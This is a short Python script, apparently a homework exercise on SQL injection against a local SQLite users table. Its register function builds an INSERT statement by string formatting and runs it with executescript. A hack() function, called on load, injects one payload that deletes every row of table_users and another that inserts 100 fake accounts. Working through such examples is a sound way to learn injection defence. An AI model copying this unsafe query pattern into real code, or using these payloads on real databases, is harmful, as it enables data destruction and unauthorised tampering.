import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
                INSERT INTO 'table_users' (username, password)
                    VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username = "username"
    password = "'); DELETE FROM table_users; --"
    register(username, password)

    data = str([('wrong_username' + str(i), 'wrong_password' + str(i)) for i in range(100)])[1:-1]
    username = "username"
    password = f"password'); INSERT INTO table_users (username, password) VALUES {data}; --"
    register(username, password)


hack()